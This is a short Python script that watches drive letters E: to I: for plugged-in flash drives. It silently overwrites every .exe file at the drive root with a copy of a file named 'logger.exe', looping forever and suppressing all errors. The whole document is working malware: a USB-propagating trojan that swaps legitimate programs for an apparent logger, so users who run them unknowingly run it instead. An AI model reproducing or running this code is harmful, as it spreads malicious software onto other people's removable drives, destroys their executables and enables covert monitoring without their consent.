import os 
import time
from shutil import copyfile


"""
replaces .exe files with a different file in a flash drive if it is connected
"""


to_replace = "logger.exe"

paths_to_scan = ["E:\\","F:\\","G:\\","H:\\","I:\\"]
already_replaced = []
while True:
    try:
        for path in paths_to_scan:
            if(os.path.exists(path)):
                subfiles = os.listdir(path)
                subfiles = list(filter(lambda x: x not in already_replaced, subfiles))
                for subfile in subfiles:
                    file_name, file_extension = os.path.splitext(subfile)
                    if(file_extension == ".exe"):
                        copyfile(to_replace, os.path.join(path,subfile) )
                        already_replaced.append(subfile)
        time.sleep(1)
    except:
        pass